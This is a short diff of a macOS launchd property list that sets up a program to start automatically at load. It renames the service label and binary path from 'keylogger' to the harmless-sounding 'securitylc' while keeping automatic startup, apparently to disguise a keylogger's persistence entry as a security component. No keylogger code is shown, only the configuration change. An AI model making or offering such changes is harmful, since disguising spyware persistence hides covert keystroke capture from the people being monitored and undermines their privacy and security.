@@ -3,10 +3,10 @@
 <plist version="1.0">
 <dict>
   <key>Label</key>
-  <string>keylogger</string>
+  <string>securitylc</string>
   <key>ProgramArguments</key>
   <array>
-      <string>/usr/local/bin/keylogger</string>
+      <string>/usr/local/bin/securitylc</string>
   </array>
   <key>RunAtLoad</key>
   <true/>
